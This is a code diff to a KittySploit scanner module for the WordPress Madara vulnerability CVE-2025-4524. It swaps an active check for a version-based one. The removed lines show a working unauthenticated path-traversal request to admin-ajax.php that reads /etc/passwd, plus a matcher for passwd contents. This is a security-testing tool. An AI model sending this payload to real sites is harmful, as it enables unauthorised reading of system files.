@@ -1,57 +1,29 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-"""CVE-2025-4524 — Madara theme/plugin LFI via admin-ajax (madara_load_more)."""
+"""CVE-2025-4524 — Madara theme/plugin version detection."""
 
 import re
+from typing import Tuple
 
 from kittysploit import *
 from lib.protocols.http.http_client import Http_client
+from lib.protocols.http.wordpress import Wordpress
 
-# PoC fixe : template = path traversal vers /etc/passwd
-_POST = {
-    "action": "madara_load_more",
-    "page": "1",
-    "template": "plugins/../../../../../../../etc/passwd",
-    "vars[orderby]": "meta_value_num",
-    "vars[paged]": "1",
-    "vars[timerange]": "",
-    "vars[posts_per_page]": "16",
-    "vars[tax_query][relation]": "OR",
-    "vars[meta_query][0][relation]": "AND",
-    "vars[meta_query][relation]": "AND",
-    "vars[post_type]": "wp-manga",
-    "vars[post_status]": "publish",
-    "vars[meta_key]": "_latest_update",
-    "vars[order]": "desc",
-    "vars[sidebar]": "right",
-    "vars[manga_archives_item_layout]": "big_thumbnail",
-}
+_THEME = "madara"
+_PLUGIN = "madara-core"
+_VULN_HIGH = (1, 6, 0, 5)
 
 
-def _passwd_like(text: str) -> bool:
-    """True si le corps ressemble à /etc/passwd (ligne root ou plusieurs entrées style passwd)."""
-    if not text or len(text) < 40:
-        return False
-    if re.search(r"^root:[x*!]:0:0:", text, re.MULTILINE):
-        return True
-    lines = re.findall(
-        r"(?m)^[a-z_][a-z0-9_-]{0,31}:[^:\r\n]+:\d+:\d+:",
-        text[:12000],
-        flags=re.IGNORECASE,
-    )
-    return len(lines) >= 3
-
-
-class Module(Scanner, Http_client):
-
+class Module(Scanner, Http_client, Wordpress):
     __info__ = {
-        "name": "WordPress Madara CVE-2025-4524 (LFI)",
+        "name": "WordPress Madara CVE-2025-4524 detection",
         "description": (
-            "Detects unauthenticated local file inclusion via the `madara_load_more` AJAX action "
-            "(path traversal in the `template` parameter, Madara theme/plugin)."
+            "Detects Madara theme/plugin versions <= 1.6.0.5 affected by CVE-2025-4524 "
+            "(unauthenticated LFI via madara_load_more template parameter)."
         ),
         "author": "KittySploit Team",
         "severity": "high",
+        "cve": "CVE-2025-4524",
         "modules": [
             "auxiliary/scanner/http/wordpress_madara_cve_2025_4524_lfi",
         ],
@@ -64,42 +36,115 @@ class Module(Scanner, Http_client):
             "path-traversal",
             "cve-2025-4524",
         ],
-    'agent': {
-        'risk': 'active',
-        'effects': ['network_probe'],
-        'expected_requests': 2,
-        'reversible': True,
-        'approval_required': False,
-        'produces': ['tech_hints', 'risk_signals', 'endpoints'],
-    },
+        "agent": {
+            "risk": "active",
+            "effects": ["network_probe"],
+            "expected_requests": 3,
+            "reversible": True,
+            "approval_required": False,
+            "produces": ["tech_hints", "risk_signals", "endpoints"],
+            "cost": 1.0,
+            "noise": 0.2,
+            "value": 1.0,
+            "requires": {
+                "min_endpoints": 0,
+                "min_params": 0,
+                "tech_hints_any": [],
+                "tech_hints_all": [],
+                "specializations_any": [],
+                "risk_signals_any": [],
+                "auth_session": False,
+                "capabilities_any": [],
+                "capabilities_all": [],
+                "confidence_min": {"wordpress": 0.3},
+                "confidence_min_any": {},
+                "endpoint_pattern_any": [],
+                "param_any": [],
+                "api_surface_ready": False,
+            },
+            "chain": {
+                "produces_capabilities": [
+                    {"capability": "file_read", "from_detail": "lfi_path"},
+                ],
+                "consumes_capabilities": [],
+                "option_bindings": {},
+                "suggested_followups": [
+                    "auxiliary/scanner/http/wordpress_madara_cve_2025_4524_lfi",
+                ],
+            },
+        },
     }
 
+    base_path = OptString("/", "WordPress base path", required=False)
+
+    def _wp_base(self) -> str:
+        return self.wp_normalize_base_path(self.base_path or self.path or "/")
+
+    def _path(self, suffix: str) -> str:
+        base = self._wp_base()
+        if not suffix.startswith("/"):
+            suffix = "/" + suffix
+        return f"{base}{suffix}" if base != "/" else suffix
+
+    def _fetch_version(self) -> Tuple[str, str]:
+        wp_base = self._wp_base()
+        for slug in (_PLUGIN, _THEME):
+            version = self.wp_plugin_version(slug, wp_base)
+            if version:
+                return version, self.wp_plugin_path(wp_base, slug, "readme.txt")
+
+        candidates = [
+            self.wp_plugin_path(wp_base, _PLUGIN, "readme.txt"),
+            self.wp_plugin_path(wp_base, _PLUGIN, "madara-core.php"),
+            f"{self._path('/wp-content/themes/madara/style.css')}",
+        ]
+        for path in candidates:
+            response = self.http_request(method="GET", path=path, allow_redirects=True)
+            if not response or response.status_code != 200:
+                continue
+            body = response.text or ""
+            for pattern in (
+                r"Stable tag:\s*([0-9]+\.[0-9]+(?:\.[0-9]+)?)",
+                r"Version:\s*([0-9]+\.[0-9]+(?:\.[0-9]+)?)",
+            ):
+                match = re.search(pattern, body, re.IGNORECASE)
+                if match:
+                    return match.group(1).strip(), path
+            if "madara" in body.lower() or "Madara" in body:
+                return "", path
+        return "", ""
+
     def run(self):
-        home = self.http_request(method="GET", path="/", allow_redirects=True)
-        if not home:
-            return False
-        h = (home.text or "").lower()
-        if "/wp-content/plugins/madara/" not in h and "madara-core" not in h and 'id="madara' not in h:
+        version, evidence_path = self._fetch_version()
+        if not evidence_path:
             return False
 
-        r = self.http_request(
-            method="POST",
-            path="/wp-admin/admin-ajax.php",
-            data=_POST,
-            headers={
-                "X-Requested-With": "XMLHttpRequest",
-                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-                "Accept": "*/*",
-            },
-            allow_redirects=False,
-            timeout=15,
-        )
-        if not r or r.status_code not in (200, 500) or not _passwd_like(r.text or ""):
+        if version:
+            if self.wp_version_in_range(version, (0, 0, 0, 0), _VULN_HIGH):
+                self.set_info(
+                    severity="high",
+                    cve="CVE-2025-4524",
+                    reason=(
+                        f"Madara {version} detected at {evidence_path}; "
+                        f"<= {_VULN_HIGH[0]}.{_VULN_HIGH[1]}.{_VULN_HIGH[2]}.{_VULN_HIGH[3]} "
+                        "is within CVE-2025-4524 affected range"
+                    ),
+                    version=version,
+                    service="wordpress",
+                )
+                return True
+            self.set_info(
+                severity="info",
+                reason=f"Madara {version} detected at {evidence_path}; appears patched for CVE-2025-4524",
+                version=version,
+                service="wordpress",
+            )
             return False
 
         self.set_info(
-            severity="high",
-            reason="Madara LFI (CVE-2025-4524): /etc/passwd-like content in response",
+            severity="medium",
             cve="CVE-2025-4524",
+            reason=f"Madara theme/plugin detected at {evidence_path}, but version could not be extracted",
+            service="wordpress",
         )
         return True
